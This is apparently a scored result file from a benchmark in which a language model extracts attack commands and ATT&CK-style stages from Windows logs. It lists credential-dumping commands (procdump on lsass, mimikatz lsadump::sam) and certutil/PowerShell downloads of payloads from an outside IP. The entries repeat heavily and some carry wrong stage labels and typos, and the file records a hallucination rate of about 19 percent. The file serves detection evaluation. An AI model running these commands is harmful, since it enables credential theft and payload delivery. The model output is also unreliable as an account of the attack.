@@ -1,0 +1,254 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "msedge.exe --no-startup-window /prefetch:5",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "HxOutlook.exe -ServerName:microsoft.windowslive.mail.AppXfbjsbkxvprcgqg6q4c9jfr0pn3kv9x5s.mca",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "CertUtil.exe -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C '\"Invoke-WebRequest http://124.223.85.207:8082/Test.hta...'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil.exe -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo test >> test.exe\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe & {if (Test-Path $env:TEMP\\T1059.003_script.bat) {exit 0} else {exit 1}} ",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "C:\\WINDOWS\\System32\\cmd.exe /c \"C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\T1059.003_script.bat\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd.exe /C spolsv.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /C mkdir %temp%\\T1119_command_prompt_collection >nul 2>&1",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.005  -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cmd.exe /C procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp ",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta...'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil -urlcache -split -f  http://124.223.85.207:8082/Test.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /noconfig /fullpaths @\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\dna1lgah\\dna1lgah.cmdline\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd.exe /C spolsv.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo test >> test.exe\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe & {if (Test-Path $env:TEMP\\T1059.003_script.bat) {exit 0} else {exit 1}} ",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "C:\\WINDOWS\\System32\\cmd.exe /c \"C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\T1059.003_script.bat\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd.exe /C spolsv.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /C mkdir %temp%\\T1119_command_prompt_collection >nul 2>&1",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.005  -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cmd.exe /C procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp ",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta...'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil -urlcache -split -f  http://124.223.85.207:8082/Test.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /noconfig /fullpaths @\"C:\\Users\\Administrator\\AppData\\Local\\Temp\\dna1lgah\\dna1lgah.cmdline\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "CertUtil.exe -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1003.003\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cmd.exe /C spolsv.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo test >> test.exe\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.003 -GetPrereqs; Invoke-AtomicTest T1059.003\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe & {if (Test-Path $env:TEMP\\T1059.003_script.bat) {exit 0} else {exit 1}} ",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "C:\\WINDOWS\\System32\\cmd.exe /c \"C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\T1059.003_script.bat\"",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd.exe /C spolsv.exe",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1119\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "cmd.exe /C.mkdir %temp%\\T1119_command_prompt_collection >nul 2>&1",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-AtomicTest T1059.005  -TestNumbers 1\"",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cmd.exe /C procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp ",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta...'",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil -urlcache -split -f  http://124.223.85.207:8082/Test.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powsershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "C:\\WINDOWS\\System32\\cmd.exe /c \"certutil.exe -decode a.txt b.txt\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "C:\\WINDOWS\\System32\\cmd.exe /C \"rundll32 user32.dll,LockWorkStation\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "C:\\WINDOWS\\System32\\cmd.exe /C \"mimikatz2.exe  lsadump::sam exit\"",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"",
+        "stage": "Defense Evasion"
+      }
+    ],
+    "narrative": "The attackers start by delivering a payload through an unattended Edge browser instance or directly downloading executables. This marks the beginning of Initial Access. Subsequently, credential harvesting occurs using Microsoft Outlook, while the attackers establish a persistent presence through certificates and dynamically generated scripts. They then engage in discovery activities, expanding their knowledge of local resources and creating new copies of critical system components. As they progress, lateral movement enables further exploitation of vulnerabilities, ultimately giving way to collection, privilege escalation, and execution of advanced tools. Throughout the operation, evasive maneuvers help maintain stealthiness and exploit weaknesses inherent to Windows systems.",
+    "_parse_ok": false,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 122913,
+      "completion_tokens": 11372,
+      "total_tokens": 134285,
+      "wall_clock_s": 156.761,
+      "parse_retries": 2
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.47058823529411764,
+      "recall": 0.5853658536585366,
+      "f1": 0.5217391304347826,
+      "tp": 24,
+      "fp": 27,
+      "fn": 17
+    },
+    "stage": {
+      "precision": 0.3333333333333333,
+      "recall": 0.4722222222222222,
+      "f1": 0.39080459770114934,
+      "tp": 17,
+      "fp": 34,
+      "fn": 19,
+      "recall_partial": 0.21739130434782608
+    },
+    "hallucination_rate": 0.19230769230769232,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 122913,
+      "completion_tokens": 11372,
+      "total_tokens": 134285,
+      "wall_clock_s": 156.761,
+      "parse_retries": 2
+    }
+  },
+  "meta": {
+    "variant": "v3_stagedefs",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe"
+  }
+}
